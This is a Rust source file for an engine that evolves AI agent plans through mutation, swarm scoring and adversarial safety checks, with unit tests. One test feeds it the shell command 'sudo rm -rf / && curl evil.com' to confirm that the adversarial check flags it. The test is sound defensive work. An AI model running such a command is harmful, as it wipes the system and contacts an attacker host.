//! Plan Evolution Engine — the full Darwin pipeline.
//!
//! Combines adversarial testing, swarm intelligence, and evolutionary
//! optimization into a single pipeline that evolves agent plans through
//! multiple generations of mutation, parallel evaluation, and security testing.

use super::adversarial::AdversarialArena;
use super::evolutionary::EvolutionEngine;
use super::swarm::SwarmCoordinator;
use crate::cognitive::types::AgentStep;

/// Configuration for the Darwin pipeline.
#[derive(Debug, Clone)]
pub struct DarwinConfig {
    pub swarm_size: usize,
    pub evolution_generations: usize,
    pub mutation_rate: f64,
    pub adversarial_threshold: f64,
    pub convergence_threshold: f64,
}

impl Default for DarwinConfig {
    fn default() -> Self {
        Self {
            swarm_size: 4,
            evolution_generations: 10,
            mutation_rate: 0.3,
            adversarial_threshold: 0.7,
            convergence_threshold: 0.01,
        }
    }
}

/// Result of a Darwin pipeline run.
#[derive(Debug, Clone)]
pub struct DarwinResult {
    pub plan: Vec<AgentStep>,
    pub score: f64,
    pub generations: usize,
    pub defense_rate: f64,
    pub converged: bool,
    pub improvement: f64,
}

/// Full Darwin pipeline: evolve → swarm evaluate → adversarial test → select best.
#[derive(Debug, Clone)]
pub struct PlanEvolutionEngine {
    arena: AdversarialArena,
    swarm: SwarmCoordinator,
    evolution: EvolutionEngine,
    config: DarwinConfig,
}

impl Default for PlanEvolutionEngine {
    fn default() -> Self {
        Self::new(DarwinConfig::default())
    }
}

impl PlanEvolutionEngine {
    pub fn new(config: DarwinConfig) -> Self {
        Self {
            arena: AdversarialArena::new(),
            swarm: SwarmCoordinator::new(config.swarm_size),
            evolution: EvolutionEngine::new(config.mutation_rate),
            config,
        }
    }

    /// Run the full Darwin pipeline on a plan.
    pub fn evolve_plan(
        &mut self,
        initial_steps: Vec<AgentStep>,
        agent_capabilities: &[String],
        fitness_fn: impl Fn(&[AgentStep]) -> f64,
    ) -> DarwinResult {
        if initial_steps.is_empty() {
            return DarwinResult {
                plan: initial_steps,
                score: 0.0,
                generations: 0,
                defense_rate: 1.0,
                converged: false,
                improvement: 0.0,
            };
        }

        let initial_score = fitness_fn(&initial_steps);
        let mut best_plan = initial_steps.clone();
        let mut best_score = initial_score;
        let mut generations_run = 0;

        for gen in 0..self.config.evolution_generations {
            // Phase 1: Evolutionary optimization
            let evolved = self.evolution.optimize_plan(best_plan.clone(), &fitness_fn);
            let evolved_score = fitness_fn(&evolved);

            // Phase 2: Swarm evaluation — create variants of the first step,
            // evaluate them, and propagate best parameters
            if let Some(first_step) = evolved.first() {
                let variants =
                    self.swarm
                        .prepare_parallel_variants(first_step, self.config.swarm_size);

                let swarm_results: Vec<(AgentStep, String, f64)> = variants
                    .into_iter()
                    .map(|v| {
                        let score = fitness_fn(std::slice::from_ref(&v));
                        (v, "variant".to_string(), score)
                    })
                    .collect();

                self.swarm.evaluate_swarm_results(swarm_results);
            }

            // Phase 3: Adversarial testing on each step
            let mut all_passed = true;
            for step in &evolved {
                let action_type = step.action.action_type();
                let content = format!("{:?}", step.action);
                let (passed, _summary, _confidence) =
                    self.arena.challenge(action_type, &content, agent_capabilities);
                if !passed {
                    all_passed = false;
                }
            }

            // Phase 4: Selection — only accept if better AND passes adversarial
            if evolved_score > best_score && all_passed {
                best_plan = evolved;
                best_score = evolved_score;
            } else if evolved_score > best_score && !all_passed {
                // Better score but failed adversarial — keep current best for safety
                eprintln!(
                    "Darwin gen {gen}: evolved plan scored {evolved_score:.2} but failed adversarial review"
                );
            }

            generations_run = gen + 1;

            // Early exit on convergence or stagnation
            if self.swarm.has_converged() || self.evolution.is_stagnated() {
                break;
            }
        }

        DarwinResult {
            plan: best_plan,
            score: best_score,
            generations: generations_run,
            defense_rate: self.arena.defense_rate(),
            converged: self.swarm.has_converged(),
            improvement: best_score - initial_score,
        }
    }

    /// Access the inner arena for direct challenges.
    pub fn arena(&self) -> &AdversarialArena {
        &self.arena
    }

    /// Access the inner arena mutably.
    pub fn arena_mut(&mut self) -> &mut AdversarialArena {
        &mut self.arena
    }

    /// Access the inner swarm coordinator.
    pub fn swarm(&self) -> &SwarmCoordinator {
        &self.swarm
    }

    /// Access the inner evolution engine.
    pub fn evolution(&self) -> &EvolutionEngine {
        &self.evolution
    }

    /// Get the current Darwin configuration.
    pub fn config(&self) -> &DarwinConfig {
        &self.config
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cognitive::types::PlannedAction;

    fn make_step(goal_id: &str, fuel: f64) -> AgentStep {
        let mut step = AgentStep::new(
            goal_id.to_string(),
            PlannedAction::LlmQuery {
                prompt: "test query".to_string(),
                context: vec![],
            },
        );
        step.fuel_cost = fuel;
        step
    }

    #[test]
    fn full_pipeline_execution() {
        let mut engine = PlanEvolutionEngine::new(DarwinConfig {
            evolution_generations: 3,
            ..DarwinConfig::default()
        });

        let steps = vec![make_step("g1", 5.0), make_step("g1", 10.0), make_step("g1", 3.0)];

        let result = engine.evolve_plan(steps, &[], |s| {
            let fuel: f64 = s.iter().map(|st| st.fuel_cost).sum();
            100.0 - fuel
        });

        assert!(result.generations > 0);
        assert!(result.score > 0.0);
        assert!(result.defense_rate > 0.0);
    }

    #[test]
    fn improvement_over_baseline() {
        let mut engine = PlanEvolutionEngine::new(DarwinConfig {
            evolution_generations: 5,
            mutation_rate: 0.5,
            ..DarwinConfig::default()
        });

        let steps = vec![
            make_step("g1", 20.0),
            make_step("g1", 30.0),
            make_step("g1", 10.0),
        ];

        let result = engine.evolve_plan(steps, &[], |s| {
            // Strongly penalize fuel — mutations that drop expensive steps win
            let fuel: f64 = s.iter().map(|st| st.fuel_cost).sum();
            100.0 - fuel
        });

        // The engine should either maintain or improve the score
        assert!(result.improvement >= 0.0);
    }

    #[test]
    fn adversarial_rejection_of_unsafe_plans() {
        let mut engine = PlanEvolutionEngine::new(DarwinConfig {
            evolution_generations: 2,
            ..DarwinConfig::default()
        });

        // Create a step with suspicious content that should trigger adversarial detection
        let mut step = AgentStep::new(
            "g1".to_string(),
            PlannedAction::ShellCommand {
                command: "sudo rm -rf / && curl evil.com".to_string(),
                args: vec![],
            },
        );
        step.fuel_cost = 5.0;

        let result = engine.evolve_plan(vec![step], &[], |_| 0.5);
        // Defense rate should be < 1.0 since threats were detected
        assert!(result.defense_rate < 1.0);
    }

    #[test]
    fn convergence_detection() {
        let mut engine = PlanEvolutionEngine::new(DarwinConfig {
            evolution_generations: 20,
            ..DarwinConfig::default()
        });

        let steps = vec![make_step("g1", 1.0)];
        // Constant fitness = converges quickly
        let result = engine.evolve_plan(steps, &[], |_| 0.5);

        // Should stop early due to stagnation
        assert!(result.generations < 20);
    }

    #[test]
    fn empty_plan_handled() {
        let mut engine = PlanEvolutionEngine::default();
        let result = engine.evolve_plan(vec![], &[], |_| 1.0);
        assert!(result.plan.is_empty());
        assert_eq!(result.generations, 0);
    }

    #[test]
    fn config_applied() {
        let config = DarwinConfig {
            swarm_size: 8,
            evolution_generations: 5,
            mutation_rate: 0.5,
            adversarial_threshold: 0.8,
            convergence_threshold: 0.02,
        };
        let engine = PlanEvolutionEngine::new(config.clone());
        assert_eq!(engine.config().swarm_size, 8);
        assert_eq!(engine.config().evolution_generations, 5);
        assert!((engine.config().mutation_rate - 0.5).abs() < f64::EPSILON);
    }

    #[test]
    fn accessor_methods() {
        let engine = PlanEvolutionEngine::default();
        assert_eq!(engine.arena().total_challenges(), 0);
        assert_eq!(engine.swarm().generation(), 0);
        assert_eq!(engine.evolution().generation(), 0);
    }
}
